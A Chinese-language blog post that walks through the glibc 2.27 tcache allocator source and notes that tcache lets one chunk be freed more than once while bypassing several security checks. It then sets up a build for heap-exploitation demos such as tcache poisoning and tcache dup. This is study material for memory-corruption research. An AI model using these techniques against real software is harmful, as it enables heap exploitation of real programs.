+<p>修改自：<a href="https://github.com/andigena/ptmalloc-fanzine/tree/master/05-tcache" target="_blank" rel="external">https://github.com/andigena/ptmalloc-fanzine/tree/master/05-tcache</a></p>
+</blockquote>
+<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>首先分析分析源码，看看 <code>tcache</code> 的工作原理</p>
+<h2 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">typedef struct tcache_entry</div><div class="line">&#123;</div><div class="line">  struct tcache_entry *next;</div><div class="line">&#125; tcache_entry;</div><div class="line"></div><div class="line"></div><div class="line">typedef struct tcache_perthread_struct</div><div class="line">&#123;</div><div class="line">  char counts[TCACHE_MAX_BINS];</div><div class="line">  tcache_entry *entries[TCACHE_MAX_BINS]; // TCACHE_MAX_BINS = 64</div><div class="line">&#125; tcache_perthread_struct;</div></pre></td></tr></table></figure>
+<p><code>tcache</code> 也是使用 类似 <code>bins</code> 方式来管理 <code>tcache</code> 。</p>
+<p> <code>tcache_perthread_struct</code> 是整个 <code>tcache</code> 的管理结构， 它的 <code>entries</code> 有 <code>64</code> 项</p>
+<p> 每一项由 相同大小的 <code>chunk</code> 通过 <code>tcache_entry</code> 使用单向链表链接（类似于<code>fastbin</code>的链接方式）。</p>
+<p><code>counts</code> 用于记录 <code>entries</code>  中每一项当前链入的 <code>chunk</code> 数目， 最多可以有 <code>7</code> 个 <code>chunk</code>。</p>
+<p><code>tcache_entry</code> 用于链接 <code>chunk</code> 的结构体， 其中就一个 <code>next</code> 指针，指向下一个相同大小的 <code>chunk</code> </p>
+<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><p>下面通过分析对 <code>tcache</code> 的两个基本操作理解上面结构体的作用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">static __always_inline void</div><div class="line">tcache_put (mchunkptr chunk, size_t tc_idx)</div><div class="line">&#123;</div><div class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</div><div class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</div><div class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</div><div class="line">  tcache-&gt;entries[tc_idx] = e;  // 增加到链表头部</div><div class="line">  ++(tcache-&gt;counts[tc_idx]);  // 记录当前 bin 的 chunk数</div><div class="line">&#125;</div><div class="line"></div><div class="line">static __always_inline void *</div><div class="line">tcache_get (size_t tc_idx)</div><div class="line">&#123;</div><div class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</div><div class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</div><div class="line">  assert (tcache-&gt;entries[tc_idx] &gt; 0);</div><div class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</div><div class="line">  --(tcache-&gt;counts[tc_idx]);</div><div class="line">  return (void *) e;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h3><p>用于把一个 <code>chunk</code> 放到 指定的 <code>tcache-&gt;entries</code> 里面去， <code>tc_idx</code> 通过  <code>csize2tidx (nb)</code> 计算得到 （<code>nb</code>是 <code>chunk</code> 的大小）。</p>
+<p>它首先把  <code>chunk+2*SIZE_SZ</code> （就是除去 <code>header</code>  部分） 强制转换成  <code>tcache_entry *</code>  类型，然后插入到  <code>tcache-&gt;entries[tc_idx]</code>  的首部，最后把 <code>tcache-&gt;counts[tc_idx]</code> 加 <code>1</code> ，表示新增了一个 <code>chunk</code> 到 该 表项。</p>
+<h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h3><p>根据 <code>tc_idx</code> 取出 <code>tcache-&gt;entries[tc_idx]</code> 的第一个<code>chunk</code> ， 然后把 指针强制转换为 <code>(void *)</code></p>
+<p>这样就可以大概得到一个图</p>
+<p><img src="assets/1525316077412.png" alt="1525316077412"></p>
+<ul>
+<li><code>tcache-&gt;entries</code> 的每一项通过 单向链表链接 <code>chunk</code> 。 </li>
+<li><code>tcache_entry</code>  和  <code>malloc chunk</code> 是重叠的， <code>tcache_entry-&gt;next</code> 和  <code>chunk-&gt;fd</code> 是一个位置。</li>
+</ul>
+<h2 id="tcache-in-malloc"><a href="#tcache-in-malloc" class="headerlink" title="tcache in malloc"></a>tcache in malloc</h2><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p><code>malloc</code> 的入口点是 <code>__libc_malloc</code> （做了一些注释）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">__libc_malloc (size_t bytes)</div><div class="line">&#123;</div><div class="line">.............</div><div class="line">.............</div><div class="line">.............</div><div class="line">#if USE_TCACHE</div><div class="line">  /* int_free also calls request2size, be careful to not pad twice.  */</div><div class="line">  size_t tbytes;</div><div class="line">  checked_request2size (bytes, tbytes);  // tbytes 为 bytes请求的 转换后得到的 chunk 的 size</div><div class="line">  size_t tc_idx = csize2tidx (tbytes);  // 根据大小 tbytes ， 找到 tcache-&gt;entries 索引</div><div class="line">  MAYBE_INIT_TCACHE ();</div><div class="line">  DIAG_PUSH_NEEDS_COMMENT;</div><div class="line">  if (tc_idx &lt; mp_.tcache_bins</div><div class="line">      /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */</div><div class="line">      &amp;&amp; tcache</div><div class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL) // 如果 tcache-&gt;entries[tc_idx] 有 chunk ，就返回</div><div class="line">    &#123;</div><div class="line">      return tcache_get (tc_idx); // 调用 tcache_get 拿到 chunk 然后返回</div><div class="line">    &#125;</div><div class="line">  DIAG_POP_NEEDS_COMMENT;</div><div class="line">#endif</div><div class="line">  if (SINGLE_THREAD_P)</div><div class="line">    &#123;</div><div class="line">      victim = _int_malloc (&amp;main_arena, bytes);</div><div class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</div><div class="line">	      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</div><div class="line">      return victim;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">  arena_get (ar_ptr, bytes);</div><div class="line">  victim = _int_malloc (ar_ptr, bytes);</div></pre></td></tr></table></figure>
+<p>首先判断 <code>tcache-&gt;entries[tc_idx]</code> 里面有没有 <code>chunk</code>  ，如果有就直接返回，否则进入 <code>_int_malloc</code>  分配内存。</p>
+<p>下面看看  <code>_int_malloc</code>   （主要看 <code>tcache</code> 处理的部分）</p>
+<h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h3><h4 id="处理fastbin"><a href="#处理fastbin" class="headerlink" title="处理fastbin"></a>处理fastbin</h4><p>首先是把 请求的 <code>size</code> 转换成 实际 <code>malloc</code> 内部的 <code>size</code> ，然后定义了一个宏 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">// 从 fastbin里面移除 pp</div><div class="line">#define REMOVE_FB(fb, victim, pp)			\</div><div class="line">  do							\</div><div class="line">    &#123;							\</div><div class="line">      victim = pp;					\</div><div class="line">      if (victim == NULL)				\</div><div class="line">	break;						\</div><div class="line">    &#125;							\</div><div class="line">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</div><div class="line">	 != victim);					\</div></pre></td></tr></table></figure>
+<p>用于多线程的中从 <code>fastbin</code> 里面移除一个 <code>chunk</code>.</p>
+<p>然后进入分配的流程， 首先如果 <code>size</code> 在 <code>fastbin</code> 的范围内进入， <code>fastbin</code> 分配的流程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"> if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))</div><div class="line">    &#123;</div><div class="line">      idx = fastbin_index (nb);</div><div class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</div><div class="line">      mchunkptr pp;</div><div class="line">      victim = *fb;</div><div class="line"></div><div class="line">      if (victim != NULL)</div><div class="line">	&#123;</div><div class="line">	  if (SINGLE_THREAD_P)</div><div class="line">	    *fb = victim-&gt;fd;</div><div class="line">	  else</div><div class="line">	    REMOVE_FB (fb, pp, victim);</div><div class="line">	  if (__glibc_likely (victim != NULL))</div><div class="line">	    &#123;</div><div class="line">	      size_t victim_idx = fastbin_index (chunksize (victim));</div><div class="line">	      if (__builtin_expect (victim_idx != idx, 0))</div><div class="line">		malloc_printerr (&quot;malloc(): memory corruption (fast)&quot;);</div><div class="line">	      check_remalloced_chunk (av, victim, nb);</div><div class="line">#if USE_TCACHE</div><div class="line"></div><div class="line">	      size_t tc_idx = csize2tidx (nb);</div><div class="line">	      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)   // 把该 fastbin 里面其他的 bin 放到 tcache 里面</div><div class="line">		&#123;</div><div class="line">		  mchunkptr tc_victim;</div><div class="line"></div><div class="line">		  /* While bin not empty and tcache not full, copy chunks.  */</div><div class="line">		  while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count  // 判断 tcache 中指定 bin 中 chunk 是否超过 7</div><div class="line">			 &amp;&amp; (tc_victim = *fb) != NULL)</div><div class="line">		    &#123;</div><div class="line">		      if (SINGLE_THREAD_P)</div><div class="line">			*fb = tc_victim-&gt;fd;</div><div class="line">		      else</div><div class="line">			&#123;</div><div class="line">			  REMOVE_FB (fb, pp, tc_victim);</div><div class="line">			  if (__glibc_unlikely (tc_victim == NULL))</div><div class="line">			    break;</div><div class="line">			&#125;</div><div class="line">		      tcache_put (tc_victim, tc_idx);</div><div class="line">		    &#125;</div><div class="line">		&#125;</div><div class="line">#endif</div><div class="line">	      void *p = chunk2mem (victim);</div><div class="line">	      alloc_perturb (p, bytes);</div><div class="line">	      return p;</div><div class="line">	    &#125;</div><div class="line">	&#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
+<ul>
+<li>在 相应  <code>fastbin</code> 找到 合适的 <code>chunk</code>  后，就把 该 <code>chunk</code> 从 <code>fastbin</code> 里面拿下来 </li>
+<li>然后 把相应  <code>fastbin</code> 里面剩下的 <code>chunk</code>  全都放到  <code>tcache</code>  里面 ， 直到  <code>tcache-&gt;entries[tc_idx]</code>  满了 (已经有 <code>7</code> 个  <code>chunk</code> 了，即  <code>tcache-&gt;counts[tc_idx] = mp_.tcache_count = 7</code>  ）。</li>
+<li>最后在返回一开始拿到的   <code>chunk</code>   给用户</li>
+</ul>
+<p>如果 <code>fastbin</code> 不能分配，则进入 <code>smallbin</code> 的分配流程</p>
+<h4 id="处理-smallbin"><a href="#处理-smallbin" class="headerlink" title="处理 smallbin"></a>处理 smallbin</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"> if (in_smallbin_range (nb))</div><div class="line">    &#123;</div><div class="line">      idx = smallbin_index (nb);</div><div class="line">      bin = bin_at (av, idx);</div><div class="line"></div><div class="line">      if ((victim = last (bin)) != bin)</div><div class="line">        &#123;</div><div class="line">          bck = victim-&gt;bk;</div><div class="line">	  if (__glibc_unlikely (bck-&gt;fd != victim))</div><div class="line">	    malloc_printerr (&quot;malloc(): smallbin double linked list corrupted&quot;);</div><div class="line">          set_inuse_bit_at_offset (victim, nb);</div><div class="line">          bin-&gt;bk = bck; </div><div class="line">          bck-&gt;fd = bin;  // 找到 chunk ， 从 smallbin拿下来准备返回给用户</div><div class="line"></div><div class="line">          if (av != &amp;main_arena)</div><div class="line">	    set_non_main_arena (victim);</div><div class="line">          check_malloced_chunk (av, victim, nb);</div><div class="line">#if USE_TCACHE</div><div class="line">	  /* While we&apos;re here, if we see other chunks of the same size, // 把指定 smallbin 里面的 bin扔到 tcache里面</div><div class="line">	     stash them in the tcache.  */</div><div class="line">	  size_t tc_idx = csize2tidx (nb);</div><div class="line">	  if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</div><div class="line">	    &#123;</div><div class="line">	      mchunkptr tc_victim;</div><div class="line"></div><div class="line">	      /* While bin not empty and tcache not full, copy chunks over.  */</div><div class="line">	      while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</div><div class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</div><div class="line">		&#123;</div><div class="line">		  if (tc_victim != 0)</div><div class="line">		    &#123;</div><div class="line">		      bck = tc_victim-&gt;bk;</div><div class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</div><div class="line">		      if (av != &amp;main_arena)</div><div class="line">			set_non_main_arena (tc_victim);</div><div class="line">		      bin-&gt;bk = bck;</div><div class="line">		      bck-&gt;fd = bin;</div><div class="line"></div><div class="line">		      tcache_put (tc_victim, tc_idx);</div><div class="line">	            &#125;</div><div class="line">		&#125;</div><div class="line">	    &#125;</div><div class="line">#endif</div><div class="line">          void *p = chunk2mem (victim);</div><div class="line">          alloc_perturb (p, bytes);</div><div class="line">          return p;</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
+<p>和 <code>fastbin</code> 是类似的操作， 在 <code>size</code> 对应的 <code>smallbin</code> 里面找到  <code>chunk</code> 后</p>
+<p>把这个  <code>chunk</code>  从链表上取下来</p>
+<p>然后把该 <code>smallbin</code> 里面剩下的 <code>bin</code> 放入到 <code>tcache</code> ， 直到 <code>tcache-&gt;entries[tc_idx]</code>  满.</p>
+<p>如果 <code>smallbin</code> 也没能分配，进入 <code>unsorted bin</code></p>
+<h4 id="遍历unsorted-bin"><a href="#遍历unsorted-bin" class="headerlink" title="遍历unsorted bin"></a>遍历unsorted bin</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line">   int iters = 0;</div><div class="line">      while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</div><div class="line">        &#123;</div><div class="line">          ....................</div><div class="line">          ....................</div><div class="line">          ....................</div><div class="line">          /* remove from unsorted list */</div><div class="line">          unsorted_chunks (av)-&gt;bk = bck;</div><div class="line">          bck-&gt;fd = unsorted_chunks (av);</div><div class="line">          // 把 bin 从 unsorted bin 里面拿下来后，先放入 tcache </div><div class="line">#if USE_TCACHE</div><div class="line">	     // 如果unsorted bin 的大小正好，扔到 tcache ，然后继续遍历</div><div class="line">		 We may return one of these chunks later.  */</div><div class="line">	      if (tcache_nb</div><div class="line">		  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</div><div class="line">		&#123;</div><div class="line">		  tcache_put (victim, tc_idx);</div><div class="line">		  return_cached = 1;</div><div class="line">		  continue;</div><div class="line">		&#125;</div><div class="line">	      else</div><div class="line">		&#123;</div><div class="line">#endif</div><div class="line">              check_malloced_chunk (av, victim, nb);</div><div class="line">              void *p = chunk2mem (victim);</div><div class="line">              alloc_perturb (p, bytes);</div><div class="line">              return p;</div><div class="line">#if USE_TCACHE</div><div class="line">		&#125;</div><div class="line">#endif</div><div class="line">            &#125;</div><div class="line"></div><div class="line">         //大小不刚好等于需要的size 的话，就把 bin放到 相应的 bin 里面。</div><div class="line">         .......................................</div><div class="line">         .......................................</div><div class="line">         .......................................</div><div class="line">#if USE_TCACHE</div><div class="line">      //如果有 大小适配的 unsorted bin 进入了 tcache(return_cached=1) 同时 mp_.tcache_unsorted_limit &gt; 0 默认为 0 ，不会进入分支, 继续遍历 </div><div class="line">      ++tcache_unsorted_count;</div><div class="line">      if (return_cached</div><div class="line">	  &amp;&amp; mp_.tcache_unsorted_limit &gt; 0</div><div class="line">	  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</div><div class="line">	&#123;</div><div class="line">	  return tcache_get (tc_idx);</div><div class="line">	&#125;</div><div class="line">#endif</div><div class="line"></div><div class="line">         .......................................</div><div class="line">         .......................................</div><div class="line">         .......................................</div><div class="line">         &#125; // end of  while ((victim = unsorted_chunks (av)-&gt;b</div><div class="line"></div><div class="line">//遍历完 unsorted bin 后 ，根据 return_cached 判断 tcache 里面是否有合适的 chunk</div><div class="line">#if USE_TCACHE</div><div class="line">      /* If all the small chunks we found ended up cached, return one now.  */</div><div class="line">      if (return_cached)</div><div class="line">	&#123;</div><div class="line">	  return tcache_get (tc_idx);</div><div class="line">	&#125;</div><div class="line">#endif</div></pre></td></tr></table></figure>
+<ul>
+<li><p>在遍历 <code>unsorted bin</code> 的时候， 如果找到大小刚好满足的 <code>bin</code> ， 不会立刻返回，而是把这个 <code>bin</code> 放入 <code>tcache</code> 里面，并且设置 <code>return_cached=1</code> ，表示 有 大小适配的 <code>unsorted bin</code>  进入了  <code>tcache</code></p>
+</li>
+<li><p>如果大小不是正好满足需要，就走一般的流程，把 <code>bin</code> 放到相应的 <code>smallbin</code> 或者 <code>largebin</code> 里面</p>
+</li>
+<li><p>遍历 <code>unsorted bin</code> 的最后，会根据 <code>return_cached</code> 判断是否有 大小适配的 <code>unsorted bin</code> 进入了  <code>tcache</code> ， <code>mp_.tcache_unsorted_limit</code> 默认为 <code>0</code> ，所以不会进入分支， 这样就会把所有的 <code>unsorted bin</code> 都放入到 <code>tcache</code>。</p>
+</li>
+<li><p>遍历完 <code>unsorted bin</code> 后 ，根据   <code>return_cached</code>  判断  <code>tcache</code>  里面是否有合适的  <code>chunk</code>  ，有的话就可以返回了</p>
+</li>
+<li><p>否则  <code>large bin</code>  ，<code>top chunk</code>  来分配。</p>
+<p>​</p>
+</li>
+</ul>
+<h2 id="tcache-in-free"><a href="#tcache-in-free" class="headerlink" title="tcache in free"></a>tcache in free</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">static void</div><div class="line">_int_free (mstate av, mchunkptr p, int have_lock)</div><div class="line">&#123;</div><div class="line"></div><div class="line">  size = chunksize (p);</div><div class="line">  check_inuse_chunk(av, p);</div><div class="line">#if USE_TCACHE</div><div class="line">  &#123;</div><div class="line">    size_t tc_idx = csize2tidx (size);  // tcache bin 的索引</div><div class="line"></div><div class="line">    if (tcache</div><div class="line">	&amp;&amp; tc_idx &lt; mp_.tcache_bins  // 64 ，最多 64 个 bin</div><div class="line">	&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  // 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</div><div class="line">      &#123;</div><div class="line">	tcache_put (p, tc_idx);</div><div class="line">	return;</div><div class="line">      &#125;</div><div class="line">  &#125;</div><div class="line">#endif</div></pre></td></tr></table></figure>
+<p>删掉了一些没影响的代码</p>
+<ul>
+<li>首先就是获取要释放的 <code>chunk</code> 的 <code>size</code> , 然后判断 <code>size</code> 是否符和规范（是否对齐之类的 <code>check</code> )， 如果合规就看  <code>tcache-&gt;counts[tc_idx]</code>  是否已经满了 ，如果没有满就直接放入 <code>tcache</code>  ， 然后返回。</li>
+<li>否则就和没有  <code>tcache</code>  是一样的处理</li>
+</ul>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在 <code>free</code> 的时候，会检测  <code>p</code>  的下一个 <code>chunk( next )</code> 的 <code>PREV_INUSE</code> 位，但是如果 <code>chunk</code> 被放入了 tcache ，<code>next-&gt;PREV_INUSE</code> 位不会被修改 ，所以还是会标志为 <code>in_used</code> . 所以我们可以 <strong>多次释放同一个 <code>chunk</code> .</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">  size = chunksize (p);</div><div class="line"></div><div class="line"></div><div class="line">  if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)</div><div class="line">      || __builtin_expect (misaligned_chunk (p), 0))</div><div class="line">    malloc_printerr (&quot;free(): invalid pointer&quot;);</div><div class="line"> </div><div class="line">  if (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</div><div class="line">    malloc_printerr (&quot;free(): invalid size&quot;);</div><div class="line"></div><div class="line">  check_inuse_chunk(av, p); // 通过下一个 chunk 的 pre_inused 位，判断当前 chunk 释放已经被释放</div><div class="line">  </div><div class="line">#if USE_TCACHE</div><div class="line">  &#123;</div><div class="line">    size_t tc_idx = csize2tidx (size);  // tcache bin 的索引</div><div class="line"></div><div class="line">    if (tcache</div><div class="line">	&amp;&amp; tc_idx &lt; mp_.tcache_bins  // 64 ，最多 64 个 bin</div><div class="line">	&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  // 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</div><div class="line">      &#123;</div><div class="line">	tcache_put (p, tc_idx);  // 如果 chunk 被放入了 tcache ，next-&gt;pre_inuse 不会被修改。</div><div class="line">	return;</div><div class="line">      &#125;</div><div class="line">  &#125;</div><div class="line">#endif</div></pre></td></tr></table></figure>
+<p>同时在 <code>malloc</code> 的时候 ，先尝试 <code>tcache</code> 分配</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">void *</div><div class="line">__libc_malloc (size_t bytes)</div><div class="line">&#123;</div><div class="line">#if USE_TCACHE</div><div class="line">  size_t tbytes;</div><div class="line">  checked_request2size (bytes, tbytes);</div><div class="line">  size_t tc_idx = csize2tidx (tbytes);</div><div class="line">  if (tc_idx &lt; mp_.tcache_bins</div><div class="line">      &amp;&amp; tcache</div><div class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != NULL)</div><div class="line">    &#123;</div><div class="line">      return tcache_get (tc_idx);</div><div class="line">    &#125;</div><div class="line">#endif</div></pre></td></tr></table></figure>
+<p>这也使得很多安全检测不会被执行。</p>
+<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><h3 id="编译glibc"><a href="#编译glibc" class="headerlink" title="编译glibc"></a>编译glibc</h3><p>首先编译一个开启 <code>tcache</code> 的 <code>glibc</code> ，我用的是 <a href="https://ftp.gnu.org/gnu/glibc/glibc-2.27.tar.bz2" target="_blank" rel="external">glibc-2.27</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">tar xvf glibc-2.27.tar.bz2</div><div class="line">mkdir gcc227_build</div><div class="line">cd gcc227_build/</div><div class="line">../glibc-2.27/configure --prefix=/usr/local/glibc227</div><div class="line">sudo mkdir /usr/local/glibc227</div><div class="line">sudo make install</div></pre></td></tr></table></figure>
+<p>可以参考</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.sysnote.org/2015/08/25/use-new-glibc/</div></pre></td></tr></table></figure>
+<h3 id="下载测试代码"><a href="#下载测试代码" class="headerlink" title="下载测试代码"></a>下载测试代码</h3><p>下载 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/andigena/ptmalloc-fanzine/tree/master/05-tcache</div></pre></td></tr></table></figure>
+<p>作为测试代码。</p>
+<p>修改 Makefile</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">PROGRAMS = tcache_poisoning overlapping_chunks_by_caching tcache_house_of_spirit tcache_dup</div><div class="line">CFLAGS += -Wpedantic -std=gnu11 -g -Wl,--rpath=/usr/local/glibc227/lib -Wl,--dynamic-linker=/usr/local/glibc227/lib/ld-linux-x86-64.so.2 -lpthread</div><div class="line"></div><div class="line">all: $(PROGRAMS)</div><div class="line">clean:</div><div class="line">	rm -f $(PROGRAMS)</div></pre></td></tr></table></figure>
+<p>增加 <code>gcc</code> 的参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-Wl,--rpath=/usr/local/glibc227/lib -Wl,--dynamic-linker=/usr/local/glibc227/lib/ld-linux-x86-64.so.2</div></pre></td></tr></table></figure>
+<p>使得程序使用 我们编译好的 <code>libc</code> 来链接程序。</p>
+<p>参考</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://blog.csdn.net/jefbai/article/details/47859335</div></pre></td></tr></table></figure>
